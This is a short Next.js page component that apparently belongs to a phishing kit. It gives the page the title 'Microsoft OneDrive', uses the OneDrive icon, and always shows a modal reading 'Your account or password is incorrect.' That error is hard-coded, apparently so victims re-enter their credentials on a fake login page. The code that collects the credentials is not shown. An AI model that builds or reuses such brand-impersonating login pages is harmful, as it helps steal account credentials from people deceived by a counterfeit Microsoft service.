import NavBar from "@/components/NavBar";
import Body from "@/components/Body";
import { useState } from "react";
import Head from "next/head";

const Error = () => {
  const openModal = true;
  const error = "Your account or password is incorrect.";
  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/OneDrive.svg" />
        <title>Microsoft OneDrive</title>
      </Head>
      <div className="bg-white h-screen text-sm flex flex-col">
        <NavBar />
        <Body error={error} openModal={openModal} />
      </div>
    </>
  );
};

export default Error;
